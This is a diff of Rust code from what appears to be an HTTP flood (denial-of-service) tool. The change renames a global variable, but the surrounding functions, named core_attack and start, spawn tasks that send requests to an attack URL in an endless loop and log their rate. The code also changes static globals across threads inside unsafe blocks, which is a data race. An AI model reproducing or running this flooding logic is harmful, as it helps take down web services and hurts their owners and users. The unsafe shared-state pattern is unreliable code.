@@ -4,7 +4,7 @@ use std::thread;
 use reqwest::Response;
 use tokio::time::Instant;
 
-use crate::ram_manger::{SAFE_PUB_VAR, UNSAFEPUBVAR};
+use crate::ram_manger::{SAFE_PUB_VAR, UNSAFE_PUB_VAR};
 use crate::where_attack::AttackData;
 
 pub async fn start(passed_var: AttackData) {
@@ -21,30 +21,30 @@ fn core_attack(passed_var: &AttackData) {
             if threads.thread_on + 1 < passed_var.threads {
                 threads.thread_on += 1;
                 unsafe {
-                    UNSAFEPUBVAR.threads_on += 1;
+                    UNSAFE_PUB_VAR.threads_on += 1;
                 }
                 drop(threads);
                 tokio::spawn(async {
                     loop {
                         let now = Instant::now();
                         unsafe {
-                            let error_data = request(&UNSAFEPUBVAR.attack_url);
+                            let error_data = request(&UNSAFE_PUB_VAR.attack_url);
                             match error_data.await {
                                 Ok(status_code) => {
-                                    UNSAFEPUBVAR.amount_sent += 1;
+                                    UNSAFE_PUB_VAR.amount_sent += 1;
                                     println!(
                                         "Threads on {}, Status code {}, Time Passed for request {} sec, Request per 10 Millisecond {}",
-                                        UNSAFEPUBVAR.threads_on,
+                                        UNSAFE_PUB_VAR.threads_on,
                                         status_code.status(),
                                         now.elapsed().as_secs(),
-                                        UNSAFEPUBVAR.amount_sent,
+                                        UNSAFE_PUB_VAR.amount_sent,
                                     );
                                 }
                                 Err(data) => {
                                     println!(
                                         "Status ERROR {} Request per 10 Millisecond {}",
                                         data,
-                                        UNSAFEPUBVAR.amount_sent
+                                        UNSAFE_PUB_VAR.amount_sent
                                     );
                                 }
                             }
@@ -60,9 +60,9 @@ fn core_attack(passed_var: &AttackData) {
 
 fn time_function() {
     unsafe {
-        UNSAFEPUBVAR.threads_on += 1;
+        UNSAFE_PUB_VAR.threads_on += 1;
         loop {
-            UNSAFEPUBVAR.amount_sent = 0;
+            UNSAFE_PUB_VAR.amount_sent = 0;
             thread::sleep(time::Duration::from_millis(10));
         }
     }
